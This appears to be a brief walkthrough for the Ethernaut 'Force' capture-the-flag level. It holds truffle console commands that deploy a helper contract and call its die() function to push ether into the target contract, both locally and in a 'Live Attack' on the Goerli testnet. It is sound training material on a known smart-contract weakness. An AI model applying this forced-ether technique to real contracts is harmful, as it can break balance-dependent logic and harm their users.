# Force

[Force](https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B)

# Test

```BASH
truffle develop
```

```JS
migrate

web3.eth.getBalance(Force.address)
web3.eth.getBalance(Feed.address)

feed = await Feed.deployed()
await feed.die()
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```

```JS
migrate
sender = accounts[5]

force = await Force.at("0x115C15DFaB81881E6D19e9C52955C711634dDb9c")
await web3.eth.getBalance(force.address)

feed = await Feed.deployed()
await web3.eth.getBalance(feed.address)
await feed.die({from: sender})
```